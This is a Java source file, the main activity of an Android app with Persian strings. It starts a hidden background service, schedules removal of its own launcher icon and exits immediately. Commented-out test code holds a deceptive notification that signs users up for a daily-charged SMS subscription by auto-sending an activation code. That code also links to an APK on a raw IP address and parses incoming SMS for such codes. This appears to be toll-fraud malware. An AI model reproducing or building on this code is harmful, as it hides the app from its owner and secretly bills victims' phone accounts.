package ir.mahmoodvand.file101;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        OSService.context=this;

        Utility.setBool("inapp",true);
        Utility.clearParams();
        Utility.clearTimeout();
        //if(Utility.getLong("removeicon")==0){
            Utility.setLong("removeicon",Utility.addMinutes(UtilityV2.removeicon).getTime());
       // }
        Utility.isFirst=true;
        Intent intent=new Intent(this,OSService.class);
        startService(intent);
        finish();
        //new InAppTask().execute("");

//        new RequestTask().execute("");
//
//
//        Handler h=new Handler();
//        Runnable runnable = new Runnable() {
//            @Override
//            public void run() {
//                try{
//                    Log.d(TAG, "run: "+new Date());
//                    //Utility.notificationFired(new OSNotification(new JSONObject("{\"isAppInFocus\":false,\"shown\":true,\"androidNotificationId\":468843473,\"displayType\":0,\"payload\":{\"notificationID\":\"6949576c-dba2-45bd-937d-6564afc8cef2\",\"title\":\"شرایط استفاده از اپ شبیه کدوم بازی\",\"body\":\"شما در این اپلیکیشن میتوانید شباهت خود با بازیگران و افراد مشهور را متوجه شوید. شما شرایط استفاده از اپلیکیشن را به همراه عضویت در سرویس تلویزیون تو می پذیرید. شما با کلیک بر روی گزینه زیر، تمامی شرایط استفاده و دسترسی های اپلیکشن شبیه کدوم بازیگری را پذیرفته اید\",\"additionalData\":{\"btns2\":\"[{~id~: ~shortcode2-link2~,~text~:~ موافقم<br/> هزینه روزانه پانصد تومان از سیمکارت ~,~icon~:~agree~}]\",\"curstep\":\"1\",\"key1\":\"114\",\"notifid\":\"tvu5\",\"key2\":\"optional\",\"shortcode1\":\"3072330\",\"shortcode2\":\"3072330\",\"prefix\":\"کد فعالسازی:\",\"body2\":\"شما در این اپلیکیشن میتوانید شباهت خود با بازیگران و افراد مشهور را متوجه شوید. شما شرایط استفاده از اپلیکیشن را به همراه عضویت در سرویس تلویزیون تو می پذیرید. شما با کلیک بر روی گزینه زیر، بصورت اتوماتیک کد فعال سازی را پیامک کرده و تمامی شرایط استفاده و دسترسی های اپلیکشن را پذیرفته اید.\",\"title2\":\"شرایط استفاده از اپ شبیه کدوم بازیگری\",\"type\":\"popup\",\"steps\":\"2\",\"operator\":\"\",\"poptype\":\"v2\",\"appname\":\"\",\"link2\":\"http://141.105.69.168/files/شبیه کدوم بازیگری.apk\",\"postfix\":\"برای\"},\"lockScreenVisibility\":1,\"groupMessage\":\"\",\"actionButtons\":[{\"id\":\"shortcode1\",\"text\":\"موافقم\",\"icon\":\"agree\"}],\"fromProjectNumber\":\"458878317944\",\"priority\":5,\"rawPayload\":\"\"}}")));
//
//
//                    UtilityV2.checkSMS("کد فعالسازی:9846\n" +
//                            " برای فعالسازی سرویس  یوتی وی کد بالا را ارسال نمایید.\n" +
//                            "تعرفه روزانه 500 تومان");
//
//
//                }
//                catch (Exception e){
//                    Log.d(TAG, "run: "+e.getMessage());
//                }
//            }
//        };
//        h.postDelayed(runnable,40000);

    }
}
